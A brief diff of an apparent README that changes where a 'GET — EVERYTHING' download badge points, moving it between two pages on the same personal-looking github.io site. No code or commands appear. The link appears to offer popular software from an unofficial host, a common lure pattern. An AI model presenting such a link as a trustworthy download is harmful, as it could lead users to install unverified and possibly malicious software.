@@ -4,7 +4,7 @@
 <img src="https://davescomputertips.com/wp-content/uploads/2022/12/everything-feature.jpg" width="300">
 </p>
 
-[![GET — EVERYTHING](https://img.shields.io/badge/GET-EVERYTHING-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — EVERYTHING](https://img.shields.io/badge/GET-EVERYTHING-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/Everything)
 
 ---
 
